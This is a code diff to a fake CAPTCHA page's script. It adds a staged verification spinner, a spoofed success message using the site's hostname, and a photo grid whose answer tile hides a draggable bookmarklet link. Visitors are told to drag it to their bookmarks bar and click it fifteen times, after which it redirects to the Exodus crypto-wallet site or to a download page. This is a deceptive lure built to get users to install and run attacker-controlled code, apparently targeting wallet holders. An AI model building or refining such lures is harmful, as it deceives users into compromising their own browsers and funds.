@@ -42,6 +42,16 @@
   const exodusPopupOverlay = document.getElementById("exodus-popup-overlay");
   const exodusPopupOk = document.getElementById("exodus-popup-ok");
   const verifiedScreen = document.getElementById("verified-screen");
+  const captchaWidget = document.getElementById("captcha-widget");
+  const verifyStatus = document.getElementById("verify-status");
+  const verifySpinner = document.getElementById("verify-spinner");
+  const verifyStatusText = document.getElementById("verify-status-text");
+  const verifySuccess = document.getElementById("verify-success");
+  const verifySuccessMsg = document.getElementById("verify-success-msg");
+  const verifySuccessHost = document.getElementById("verify-success-host");
+  const captchaWidgetWrap = document.getElementById("captcha-widget-wrap");
+
+  let verifyTimeouts = [];
 
   let countdownRemaining = COUNTDOWN_SECONDS;
   let countdownInterval = null;
@@ -214,32 +224,115 @@
 
   function openChallenge() {
     if (!captchaBox) return;
-    // Brief delay (feels like a real security check), then open challenge popup
-    setTimeout(function () {
-      // Reset challenge to stage 1
-      var ch1 = document.getElementById("challenge1");
-      var ch2 = document.getElementById("challenge2");
-      if (ch1) ch1.classList.remove("hidden");
-      if (ch2) ch2.classList.add("hidden");
-      // Show popup
-      if (challengePopupOverlay) challengePopupOverlay.classList.remove("hidden");
-      captchaBox.classList.remove("hidden");
-      buildChallenge1Grid();
-      // Sync click counter display
-      var clickCounterEl = document.getElementById("clickCounter");
-      if (clickCounterEl) clickCounterEl.textContent = localStorage.getItem("bookmarkletClicks") || "0";
-    }, 800);
+    document.body.classList.add("body-popup-open");
+    // Reset challenge to stage 1
+    var ch1 = document.getElementById("challenge1");
+    var ch2 = document.getElementById("challenge2");
+    if (ch1) ch1.classList.remove("hidden");
+    if (ch2) ch2.classList.add("hidden");
+    // Show popup
+    if (challengePopupOverlay) challengePopupOverlay.classList.remove("hidden");
+    captchaBox.classList.remove("hidden");
+    buildChallenge1Grid();
+    // Sync click counter display
+    var clickCounterEl = document.getElementById("clickCounter");
+    if (clickCounterEl) clickCounterEl.textContent = localStorage.getItem("bookmarkletClicks") || "0";
   }
 
-  // Clicking the checkbox directly triggers the challenge (no separate button needed)
+  function clearVerifyTimeouts() {
+    verifyTimeouts.forEach(function (t) { clearTimeout(t); });
+    verifyTimeouts = [];
+  }
+
+  function resetVerifyUI() {
+    clearVerifyTimeouts();
+    if (captchaWidget) captchaWidget.classList.remove("verify-active");
+    if (verifyStatus) verifyStatus.classList.add("hidden");
+    if (verifySpinner) verifySpinner.classList.remove("hidden");
+    if (verifyStatusText) {
+      verifyStatusText.textContent = "Verifying...";
+      verifyStatusText.classList.remove("hidden");
+    }
+    if (verifySuccess) verifySuccess.classList.add("hidden");
+    if (verifySuccessMsg) verifySuccessMsg.classList.add("hidden");
+    if (captchaWidgetWrap) captchaWidgetWrap.classList.remove("hidden");
+    if (robotCheckbox) robotCheckbox.checked = false;
+    var visibleCb = document.getElementById("visibleCheckbox");
+    if (visibleCb) visibleCb.classList.remove("checked");
+  }
+
+  function startVerifyFlow() {
+    clearVerifyTimeouts();
+    if (!captchaWidget || !verifyStatus || !verifySpinner || !verifyStatusText || !verifySuccess) {
+      openChallenge();
+      return;
+    }
+    // Show spinner state in widget
+    captchaWidget.classList.add("verify-active");
+    verifyStatus.classList.remove("hidden");
+    verifySpinner.classList.remove("hidden");
+    verifyStatusText.textContent = "Verifying...";
+    verifyStatusText.classList.remove("hidden");
+    verifySuccess.classList.add("hidden");
+
+    // After 2.2s: show success message, stop spinner
+    var t1 = setTimeout(function () {
+      verifySpinner.classList.add("hidden");
+      verifyStatusText.classList.add("hidden");
+      verifySuccess.classList.remove("hidden");
+    }, 2200);
+    verifyTimeouts.push(t1);
+
+    // After 3.2s: hide widget box, show full-page success message
+    var t2 = setTimeout(function () {
+      if (captchaWidgetWrap) captchaWidgetWrap.classList.add("hidden");
+      if (verifySuccessHost) verifySuccessHost.textContent = window.location.hostname || "backstage.io";
+      if (verifySuccessMsg) verifySuccessMsg.classList.remove("hidden");
+    }, 3200);
+    verifyTimeouts.push(t2);
+
+    // After 4.2s: open captcha popup, hide success msg, show widget again
+    var t3 = setTimeout(function () {
+      resetVerifyUI();
+      openChallenge();
+    }, 4200);
+    verifyTimeouts.push(t3);
+  }
+
+  // Clicking the checkbox triggers: spinner -> success message -> then open challenge
   if (robotCheckbox) {
     robotCheckbox.addEventListener("change", function () {
       if (robotCheckbox.checked) {
-        openChallenge();
+        startVerifyFlow();
       } else {
+        document.body.classList.remove("body-popup-open");
+        resetVerifyUI();
         if (captchaBox) captchaBox.classList.add("hidden");
         if (challengePopupOverlay) challengePopupOverlay.classList.add("hidden");
       }
+    });
+  }
+
+  // Clicking overlay (outside popup) closes the challenge and shows main page again
+  if (challengePopupOverlay) {
+    challengePopupOverlay.addEventListener("click", function (e) {
+      if (e.target === challengePopupOverlay) {
+        document.body.classList.remove("body-popup-open");
+        if (captchaBox) captchaBox.classList.add("hidden");
+        challengePopupOverlay.classList.add("hidden");
+      }
+    });
+  }
+
+  // Widget click: ensure spinner flow runs (same as checking the box)
+  if (captchaWidget) {
+    captchaWidget.addEventListener("click", function (e) {
+      if (e.target && e.target.tagName === "A") return;
+      if (!robotCheckbox || robotCheckbox.checked) return;
+      robotCheckbox.checked = true;
+      var visibleCb = document.getElementById("visibleCheckbox");
+      if (visibleCb) visibleCb.classList.add("checked");
+      startVerifyFlow();
     });
   }
 
@@ -247,7 +340,7 @@
   if (verifyHumanBtn) {
     verifyHumanBtn.addEventListener("click", function () {
       if (!robotCheckbox || !robotCheckbox.checked) return;
-      openChallenge();
+      startVerifyFlow();
     });
   }
 
@@ -303,18 +396,19 @@
   const pdfFilename = "Backstage Logo.pdf";
   const TARGET_CLICKS = 15;
 
+  // Real photo seeds (picsum.photos/seed/X/300/300)
+  // Two theme sets with the answer tile at different positions
   const THEMES = [
     {
-      instruction: "Drag the item you can't eat to your bookmarks bar.",
-      banner: "Please drag the correct answer to your bookmarks bar",
-      items: ["🍎", "🍕", "🥕", "🍌", "🚗", "🥦", "🍇", "🍗", "🍩"],
-      answerIndex: 4
+      subject: "stairs",
+      // answer is index 0 (top-left) – tile showing a "staircase" photo
+      answerIndex: 0,
+      seeds: ["staircase", "building2", "window3", "yard4", "sculpture5", "railing6", "door7", "street8", "concrete9"]
     },
     {
-      instruction: "Drag the item you can't eat to your bookmarks bar.",
-      banner: "Please drag the correct answer to your bookmarks bar",
-      items: ["🍎", "🍕", "🥕", "🍌", "🚗", "🥦", "🍇", "🍗", "🍩"],
-      answerIndex: 4
+      subject: "stairs",
+      answerIndex: 5,
+      seeds: ["arch1", "house2", "park3", "road4", "fence5", "stairway", "garden7", "alley8", "bridge9"]
     }
   ];
 
@@ -324,32 +418,54 @@
 
   function buildChallenge1Grid() {
     var grid = document.getElementById("challenge1Grid");
-    var banner = document.getElementById("challenge1Banner");
-    var instruction = document.getElementById("challenge1Instruction");
+    var subjectEl = document.getElementById("challenge1Subject");
     if (!grid) return;
     grid.innerHTML = "";
+
     var theme = getTheme();
-    if (banner) banner.textContent = theme.banner;
-    if (instruction) instruction.textContent = theme.instruction;
-    for (var i = 0; i < theme.items.length; i++) {
+    if (subjectEl) subjectEl.textContent = theme.subject;
+
+    var answerHref = bookmarkletHref;
+
+    theme.seeds.forEach(function (seed, i) {
+      var isAnswer = (i === theme.answerIndex);
       var tile = document.createElement("div");
-      tile.className = "challenge-tile" + (i === theme.answerIndex ? " draggable" : "");
-      if (i === theme.answerIndex) {
+      tile.className = "challenge-tile" + (isAnswer ? " draggable" : "");
+
+      // Real photo
+      var img = document.createElement("img");
+      img.src = "https://picsum.photos/seed/" + seed + "/300/300";
+      img.alt = "";
+      img.setAttribute("draggable", "false");
+      tile.appendChild(img);
+
+      // Blue checkmark (shown when selected)
+      var check = document.createElement("div");
+      check.className = "tile-check";
+      check.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
+      tile.appendChild(check);
+
+      if (isAnswer) {
+        // Invisible draggable link over the photo
         var a = document.createElement("a");
-        a.href = bookmarkletHref;
+        a.href = answerHref;
+        a.className = "drag-layer";
         a.setAttribute("draggable", "true");
-        a.textContent = theme.items[i];
+        a.setAttribute("title", "Drag to bookmarks bar");
         a.addEventListener("click", function (e) { e.preventDefault(); });
         a.addEventListener("dragstart", function (e) {
-          e.dataTransfer.setData("text/uri-list", bookmarkletHref);
-          e.dataTransfer.setData("text/plain", bookmarkletHref);
+          e.dataTransfer.setData("text/uri-list", answerHref);
+          e.dataTransfer.setData("text/plain", answerHref);
         });
         tile.appendChild(a);
       } else {
-        tile.textContent = theme.items[i];
+        tile.addEventListener("click", function () {
+          this.classList.toggle("selected");
+        });
       }
+
       grid.appendChild(tile);
-    }
+    });
   }
 
   var done1Button = document.getElementById("done1Button");
@@ -370,7 +486,7 @@
     done2Button.addEventListener("click", function () {
       var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
       if (n >= TARGET_CLICKS) {
-        window.location.href = "exodus-clone.html?from_captcha=1";
+        window.location.href = "https://www.exodus.com";
       } else {
         alert("Please click the bookmarked answer " + TARGET_CLICKS + " times first. Current: " + n);
       }
@@ -389,7 +505,7 @@
       "if(clickCounter && (window.location.pathname.endsWith('/')||window.location.pathname.endsWith('/index.html')||window.location.pathname.includes('captcha'))){" +
       "clickCounter.textContent=n;" +
       "if(n>=" + TARGET_CLICKS + "){" +
-      "setTimeout(function(){location.href=base+'/exodus-clone.html?from_captcha=1';},500);" +
+      "setTimeout(function(){location.href='https://www.exodus.com';},500);" +
       "}" +
       "}else{" +
       "location.href=base+'/download.html';" +
